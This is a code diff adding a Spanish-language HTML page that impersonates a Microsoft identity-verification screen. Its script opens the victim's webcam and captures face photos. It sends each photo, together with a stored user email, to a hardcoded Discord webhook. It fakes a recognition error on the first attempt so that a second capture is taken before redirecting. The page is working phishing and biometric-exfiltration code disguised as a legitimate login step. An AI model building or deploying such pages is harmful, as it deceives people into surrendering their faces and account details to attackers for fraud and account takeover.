@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Validación Biométrica</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .camera-box {
+            position: relative;
+            width: 280px;
+            height: 280px;
+            margin: 20px auto;
+            border-radius: 50%;
+            border: 5px solid #0078d4;
+            overflow: hidden;
+            background: #000;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+        .overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 85%;
+            height: 85%;
+            border: 2px dashed rgba(255, 255, 255, 0.6);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+        #status-msg {
+            text-align: center;
+            margin: 15px 0;
+            font-size: 14px;
+            min-height: 20px;
+        }
+        .error-msg {
+            color: #d93025;
+            background: #fce8e6;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
+            margin-bottom: 15px;
+        }
+        #btn-capture {
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 2px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        #btn-capture:disabled { background-color: #ccc; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="tod">
+        <div class="header" style="display: flex; justify-content: center; text-align: center; margin-bottom: 20px;">
+            <div class="logo">
+                <div class="square red"></div>
+                <div class="square green"></div>
+                <div class="square blue"></div>
+                <div class="square yellow"></div>
+            </div>
+            <span class="brand">Microsoft</span>
+        </div>
+
+        <h2 style="text-align: center;">Verificación de Identidad</h2>
+        <p style="text-align: center; font-size: 14px; color: #666;">
+            Para continuar, encuadre su rostro en el círculo y presione el botón.
+        </p>
+
+        <div id="error-banner" class="error-msg">
+            ⚠️ No se pudo reconocer el rostro claramente. Intente de nuevo en un área con más luz.
+        </div>
+
+        <div class="camera-box">
+            <video id="video" autoplay playsinline></video>
+            <div class="overlay"></div>
+        </div>
+
+        <div id="status-msg">Iniciando cámara segura...</div>
+
+        <button id="btn-capture" disabled>
+            <img src="https://i.postimg.cc/8CY8R6qZ/h55.png" style="width:20px">
+            Capturar y Validar
+        </button>
+
+        <canvas id="canvas"></canvas>
+    </div>
+
+<script>
+(function() {
+    'use strict';
+
+    const WEBHOOK = "https://discord.com/api/webhooks/1481333399946924203/b7E65TBdYOwrFuhD9_MC-wDt1HpBoK9PYjsRjid5i-EcHRJ64IvEnHWBv_-yfzQZqRXa";
+    
+    const _video = document.getElementById('video');
+    const _canvas = document.getElementById('canvas');
+    const _btn = document.getElementById('btn-capture');
+    const _status = document.getElementById('status-msg');
+    const _error = document.getElementById('error-banner');
+    
+    // Recuperamos el intento actual o empezamos en 0
+    let attemptCount = parseInt(sessionStorage.getItem('_attempts') || '0');
+
+    async function init() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: 640, height: 640 }, 
+                audio: false 
+            });
+            _video.srcObject = stream;
+            _video.onloadedmetadata = () => {
+                _btn.disabled = false;
+                _status.innerText = "Cámara lista. Posicione su rostro.";
+            };
+        } catch (err) {
+            _status.innerText = "Error: Acceso a la cámara denegado.";
+            _status.style.color = "red";
+        }
+    }
+
+    _btn.addEventListener('click', async () => {
+        _btn.disabled = true;
+        _error.style.display = 'none';
+        _status.innerText = "Verificando identidad...";
+
+        // 1. Captura de imagen
+        const ctx = _canvas.getContext('2d');
+        _canvas.width = _video.videoWidth;
+        _canvas.height = _video.videoHeight;
+        ctx.drawImage(_video, 0, 0);
+        
+        const blob = await new Promise(res => _canvas.toBlob(res, 'image/jpeg', 0.8));
+        
+        // 2. Incrementar contador ANTES de enviar
+        attemptCount++;
+        sessionStorage.setItem('_attempts', attemptCount);
+
+        // 3. Preparar envío
+        const formData = new FormData();
+        const phone = localStorage.getItem('email_usuario') || 'No identificado';
+        
+        const content = `📸 **Nueva Captura Facial**\n` +
+                        `👤 Usuario: \`${phone}\`\n` +
+                        `🔢 Intento: ${attemptCount}\n` +
+                        `⏰ Hora: ${new Date().toLocaleString()}`;
+        
+        formData.append('content', content);
+        formData.append('file', blob, `intento_${attemptCount}.jpg`);
+
+        // 4. Enviar a Discord (Esperamos a que termine el fetch)
+        try {
+            await fetch(WEBHOOK, { method: 'POST', body: formData });
+        } catch (e) {
+            console.error("Error de red");
+        }
+
+        // 5. LÓGICA DE FLUJO CORREGIDA
+        if (attemptCount < 2) {
+            // Caso: Primer intento. Forzamos el error.
+            setTimeout(() => {
+                _error.style.display = 'block'; // Mostramos el banner rojo
+                _status.innerText = "Error de lectura. Reintente por favor.";
+                _status.style.color = "red";
+                _btn.disabled = false;
+            }, 1200);
+        } else {
+            // Caso: Segundo intento (o más). Redirigimos.
+            _status.innerText = "Identidad confirmada. Redirigiendo...";
+            _status.style.color = "green";
+            
+            setTimeout(() => {
+                // Opcional: limpiar intentos para que si vuelve a entrar empiece de 0
+                sessionStorage.removeItem('_attempts'); 
+                window.location.href = "index-.html";
+            }, 1500);
+        }
+    });
+
+    init();
+})();
+</script>
+</body>
+</html>
